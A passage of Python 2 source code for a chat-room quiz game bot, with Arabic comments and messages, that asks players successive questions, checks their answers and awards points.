   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==10 and Melody_Game['melody'][s[1]][jid]['g'] == 11: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['9s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['9h'])	
    msg(s[3],s[1], StArT_Game[8]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty9(s[3],s[1],jid,p) 		
	
   ##10
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==11: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['10s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['10h'])	
    msg(s[3],s[1], StArT_Game[9]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty10(s[3],s[1],jid,p) 	
			
   ##10		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==11 and Melody_Game['melody'][s[1]][jid]['g'] == 12: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['10s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['10h'])	
    msg(s[3],s[1], StArT_Game[9]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty10(s[3],s[1],jid,p) 		
	
   ##11
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==12: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['11s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['11h'])	
    msg(s[3],s[1], StArT_Game[10]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty11(s[3],s[1],jid,p) 	
			
   ##11		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==12 and Melody_Game['melody'][s[1]][jid]['g'] == 13: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['11s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['11h'])	
    msg(s[3],s[1], StArT_Game[10]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty11(s[3],s[1],jid,p) 	
	
   ##12
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==13: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['12s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['12h'])	
    msg(s[3],s[1], StArT_Game[11]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty12(s[3],s[1],jid,p) 	
			
   ##12	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==13 and Melody_Game['melody'][s[1]][jid]['g'] == 14: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['12s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['12h'])	
    msg(s[3],s[1], StArT_Game[11]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty12(s[3],s[1],jid,p) 	
	
   ##13
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==14: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['13s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['13h'])	
    msg(s[3],s[1], StArT_Game[12]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty13(s[3],s[1],jid,p) 	
			
   ##13	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==14 and Melody_Game['melody'][s[1]][jid]['g'] == 15: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['13s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['13h'])	
    msg(s[3],s[1], StArT_Game[12]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty13(s[3],s[1],jid,p) 	
	
   ##14
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==15: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['14s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['14h'])	
    msg(s[3],s[1], StArT_Game[13]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty14(s[3],s[1],jid,p) 	
			
   ##14	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==15 and Melody_Game['melody'][s[1]][jid]['g'] == 16: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['14s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['14h'])	
    msg(s[3],s[1], StArT_Game[13]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty14(s[3],s[1],jid,p) 	
	
	
	
   ##15
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==16: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['15s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['15h'])	
    msg(s[3],s[1], StArT_Game[14]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty15(s[3],s[1],jid,p) 	
			
   ##15	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==16 and Melody_Game['melody'][s[1]][jid]['g'] == 17: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['15s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['15h'])	
    msg(s[3],s[1], StArT_Game[14]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty15(s[3],s[1],jid,p) 	
def handler_chat_message(r,t, s, p):
 
 global Melody_Game
 if 'melody' not in Melody_Game:
    Melody_Game['melody']={}
 if not s[1] in Melody_Game["melody"]:
    Melody_Game['melody'][s[1]]={}  
 if not p: return
 if s[2]==get_bot_nick(s[1]): return	  

 jid=get_true_jid(s[1]+'/'+s[2]) 

 if jid in Melody_Game['melody'][s[1]] and s[1] in START1: 
 
         #السوال الاول
         guab1x = ''.join(Game_Bot1[s[1]][jid]['1'])
         hear1x = ''.join(Game_Bot1[s[1]][jid]['1h'])	
         agabat1 = ''.join(Game_Bot1[s[1]][jid]['1t'])	 		 
         write_file(Game_Bot1_FILE, str(Game_Bot1))		  
         if Melody_Game['melody'][s[1]][jid]['a']==2 and Melody_Game['melody'][s[1]][jid]['c']==1: 
          if  p == guab1x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           Melody_Game['melody'][s[1]][jid]['g'] += 2		   
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[23])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[40])  	
           Game_Bot['rsed'][jid]="100"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto1(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat1)
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear1x: pass
          else: 	
           reply(t, s, s[2]+' : '+StArT_Game[39])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 		   
		   
		   
		   
		   
         #######################################################################################   
         #2   متابعة السوال الاول		 
         elif StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==3 and Melody_Game['melody'][s[1]][jid]['c']==1:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1		   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual2 = random.choice(Question2['m'].keys()) 
           hear2 = ''.join(Question2['m'][sual2].keys())  
           guab2 = ''.join(Question2['m'][sual2][hear2].keys()) 
           new2 = Question2['m'][sual2][hear2][guab2]	
           Game_Bot1[s[1]][jid]['2t']=new2			   
           Game_Bot1[s[1]][jid]['2']=guab2
           Game_Bot1[s[1]][jid]['2s']=sual2
           Game_Bot1[s[1]][jid]['2h']=hear2	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual2x = ''.join(Game_Bot1[s[1]][jid]['2s'])
           hear2x = ''.join(Game_Bot1[s[1]][jid]['2h'])		   
           msg(s[3],s[1], StArT_Game[1]%(sual2x,hear2x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty1(s[3],s[1],jid,p) 
           return  p	
         elif StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==3 and Melody_Game['melody'][s[1]][jid]['c']==1:	
            del START1[s[1]]
            msg(s[3],s[1], StArT_Game[18]) 
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
			
		 # السوال الثاني     
         elif Melody_Game['melody'][s[1]][jid]['a']==3 and Melody_Game['melody'][s[1]][jid]['c']==2: 
          guab2x = ''.join(Game_Bot1[s[1]][jid]['2'])
          hear2x = ''.join(Game_Bot1[s[1]][jid]['2h'])	
          agabat2 = ''.join(Game_Bot1[s[1]][jid]['2t'])			  
          if  p == guab2x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		   			   
           msg(s[3],s[1], StArT_Game[24])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[42])  	
           stop_game_auto2(s[3],s[1],jid,p) 		   
           Game_Bot['rsed'][jid]="200"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		     
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat2)
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear2x: pass		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[41])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")
           return 			   
           #######################################################################################   

   
   
         #######################################################################################   
         #3  متابعة السوال ثاني
         elif StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==4 and Melody_Game['melody'][s[1]][jid]['c']==2:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual3 = random.choice(Question3['m'].keys()) 
           hear3 = ''.join(Question3['m'][sual3].keys())  
           guab3 = ''.join(Question3['m'][sual3][hear3].keys())
           new3 = Question3['m'][sual3][hear3][guab3]	
           Game_Bot1[s[1]][jid]['3t']=new3			   
           Game_Bot1[s[1]][jid]['3']=guab3
           Game_Bot1[s[1]][jid]['3s']=sual3
           Game_Bot1[s[1]][jid]['3h']=hear3	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual3x = ''.join(Game_Bot1[s[1]][jid]['3s'])
           hear3x = ''.join(Game_Bot1[s[1]][jid]['3h'])		   
           msg(s[3],s[1], StArT_Game[2]%(sual3x,hear3x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty2(s[3],s[1],jid,p) 
           return  p	
         elif StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==4 and Melody_Game['melody'][s[1]][jid]['c']==2:	
            del START1[s[1]]
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الثالث		   		   
         if Melody_Game['melody'][s[1]][jid]['a']==4 and Melody_Game['melody'][s[1]][jid]['c']==3: 
          guab3x = ''.join(Game_Bot1[s[1]][jid]['3'])
          hear3x = ''.join(Game_Bot1[s[1]][jid]['3h'])	
          agabat3 = ''.join(Game_Bot1[s[1]][jid]['3t'])			  
          if  p == guab3x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[25])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[44])  	
           Game_Bot['rsed'][jid]="300"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto3(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat3)	
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear3x: pass		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[43])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 	
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 			   
           #######################################################################################   		   
		   
		   
         #4  متابعة السوال الثالث
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==5 and Melody_Game['melody'][s[1]][jid]['c']==3:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual4 = random.choice(Question4['m'].keys()) 
           hear4 = ''.join(Question4['m'][sual4].keys())  
           guab4 = ''.join(Question4['m'][sual4][hear4].keys()) 
           new4 = Question4['m'][sual4][hear4][guab4]	
           Game_Bot1[s[1]][jid]['4t']=new4			   
           Game_Bot1[s[1]][jid]['4']=guab4
           Game_Bot1[s[1]][jid]['4s']=sual4
           Game_Bot1[s[1]][jid]['4h']=hear4	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual4x = ''.join(Game_Bot1[s[1]][jid]['4s'])
           hear4x = ''.join(Game_Bot1[s[1]][jid]['4h'])		   
           msg(s[3],s[1], StArT_Game[3]%(sual4x,hear4x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty3(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==5 and Melody_Game['melody'][s[1]][jid]['c']==3:	
            del START1[s[1]]
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الرابع   		   
         if Melody_Game['melody'][s[1]][jid]['a']==5 and Melody_Game['melody'][s[1]][jid]['c']==4: 
          guab4x = ''.join(Game_Bot1[s[1]][jid]['4'])
          hear4x = ''.join(Game_Bot1[s[1]][jid]['4h'])	
          agabat4 = ''.join(Game_Bot1[s[1]][jid]['4t'])			  
          if  p == guab4x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[26])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[46])  	
           Game_Bot['rsed'][jid]="500"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto4(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat4)			
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear4x: pass		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[45])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 			   
		   
         #5  متابعة السوال الخامس
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==6 and Melody_Game['melody'][s[1]][jid]['c']==4:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual5 = random.choice(Question5['m'].keys()) 
           hear5 = ''.join(Question5['m'][sual5].keys())  
           guab5 = ''.join(Question5['m'][sual5][hear5].keys())  
           new5 = Question5['m'][sual5][hear5][guab5]	
           Game_Bot1[s[1]][jid]['5t']=new5			   
           Game_Bot1[s[1]][jid]['5']=guab5
           Game_Bot1[s[1]][jid]['5s']=sual5
           Game_Bot1[s[1]][jid]['5h']=hear5	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual5x = ''.join(Game_Bot1[s[1]][jid]['5s'])
           hear5x = ''.join(Game_Bot1[s[1]][jid]['5h'])		   
           msg(s[3],s[1], StArT_Game[4]%(sual5x,hear5x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty5(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==6 and Melody_Game['melody'][s[1]][jid]['c']==4:	
            del START1[s[1]]
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الخامس	   
         if Melody_Game['melody'][s[1]][jid]['a']==6 and Melody_Game['melody'][s[1]][jid]['c']==5: 
          guab5x = ''.join(Game_Bot1[s[1]][jid]['5'])
          hear5x = ''.join(Game_Bot1[s[1]][jid]['5h'])		 
          agabat5 = ''.join(Game_Bot1[s[1]][jid]['5t'])			  
          if  p == guab5x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[27])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[48])  	
           Game_Bot['rsed'][jid]="1000"   
           Game_Bot['sapt'][jid]="1000"   		   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto5(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat5)	
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear5x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[47])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 			   		   
		   
         #6  متابعة السوال السادس
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==7 and Melody_Game['melody'][s[1]][jid]['c']==5:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual6 = random.choice(Question6['m'].keys()) 
           hear6 = ''.join(Question6['m'][sual6].keys())  
           guab6 = ''.join(Question6['m'][sual6][hear6].keys())  
           new6 = Question6['m'][sual6][hear6][guab6]	
           Game_Bot1[s[1]][jid]['6t']=new6		   
           Game_Bot1[s[1]][jid]['6']=guab6
           Game_Bot1[s[1]][jid]['6s']=sual6
           Game_Bot1[s[1]][jid]['6h']=hear6	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual6x = ''.join(Game_Bot1[s[1]][jid]['6s'])
           hear6x = ''.join(Game_Bot1[s[1]][jid]['6h'])		   
           msg(s[3],s[1], StArT_Game[5]%(sual6x,hear6x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty6(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==7 and Melody_Game['melody'][s[1]][jid]['c']==5:	
            del START1[s[1]]
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال السادس   
         if Melody_Game['melody'][s[1]][jid]['a']==7 and Melody_Game['melody'][s[1]][jid]['c']==6: 
          guab6x = ''.join(Game_Bot1[s[1]][jid]['6'])
          hear6x = ''.join(Game_Bot1[s[1]][jid]['6h'])	 	
          agabat6 = ''.join(Game_Bot1[s[1]][jid]['6t'])			  
          if  p == guab6x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[28])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[50])  	
           Game_Bot['rsed'][jid]="2000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           stop_game_auto6(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat6)	
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear6x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[49])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="1000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 	
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 			   		   		   
		   
         #7  متابعة السوال السابع
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==8 and Melody_Game['melody'][s[1]][jid]['c']==6:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual7 = random.choice(Question7['m'].keys()) 
           hear7 = ''.join(Question7['m'][sual7].keys())  
           guab7 = ''.join(Question7['m'][sual7][hear7].keys())   	
           new7 = Question7['m'][sual7][hear7][guab7]	
           Game_Bot1[s[1]][jid]['7t']=new7		   
           Game_Bot1[s[1]][jid]['7']=guab7
           Game_Bot1[s[1]][jid]['7s']=sual7
           Game_Bot1[s[1]][jid]['7h']=hear7	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual7x = ''.join(Game_Bot1[s[1]][jid]['7s'])
           hear7x = ''.join(Game_Bot1[s[1]][jid]['7h'])		   
           msg(s[3],s[1], StArT_Game[6]%(sual7x,hear7x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty7(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==8 and Melody_Game['melody'][s[1]][jid]['c']==6:	
            del START1[s[1]]				
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال السابع 
         if Melody_Game['melody'][s[1]][jid]['a']==8 and Melody_Game['melody'][s[1]][jid]['c']==7: 
          guab7x = ''.join(Game_Bot1[s[1]][jid]['7'])
          hear7x = ''.join(Game_Bot1[s[1]][jid]['7h'])	
          agabat7 = ''.join(Game_Bot1[s[1]][jid]['7t'])			  
          if  p == guab7x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[29])   
           time.sleep(2)  		   
           msg(s[3],s[1],StArT_Game[52])  	
           Game_Bot['rsed'][jid]="4000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           stop_game_auto7(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]:
           msg(s[3],s[1],StArT_Game[21]% agabat7)			
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear7x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[51])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="1000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 		
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #8  متابعة السوال الثامن
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==9 and Melody_Game['melody'][s[1]][jid]['c']==7:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual8 = random.choice(Question8['m'].keys()) 
           hear8 = ''.join(Question8['m'][sual8].keys())  
           guab8 = ''.join(Question8['m'][sual8][hear8].keys())   
           new8 = Question8['m'][sual8][hear8][guab8]	
           Game_Bot1[s[1]][jid]['8t']=new8			   
           Game_Bot1[s[1]][jid]['8']=guab8
           Game_Bot1[s[1]][jid]['8s']=sual8
           Game_Bot1[s[1]][jid]['8h']=hear8	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual8x = ''.join(Game_Bot1[s[1]][jid]['8s'])
           hear8x = ''.join(Game_Bot1[s[1]][jid]['8h'])		   
           msg(s[3],s[1], StArT_Game[7]%(sual8x,hear8x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty8(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==9 and Melody_Game['melody'][s[1]][jid]['c']==7:	
            del START1[s[1]]			
            msg(s[3],s[1], StArT_Game[18])  
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
			
         #سوال الثامن
         if Melody_Game['melody'][s[1]][jid]['a']==9 and Melody_Game['melody'][s[1]][jid]['c']==8: 
          guab8x = ''.join(Game_Bot1[s[1]][jid]['8'])
          hear8x = ''.join(Game_Bot1[s[1]][jid]['8h']) 	
          agabat8 = ''.join(Game_Bot1[s[1]][jid]['8t'])			  
          if p == guab8x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[30])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[54])  	
           Game_Bot['rsed'][jid]="8000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           stop_game_auto8(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat8)			 
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear8x: pass		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[53])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="1000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #9  متابعة السوال التاسع
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==10 and Melody_Game['melody'][s[1]][jid]['c']==8:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
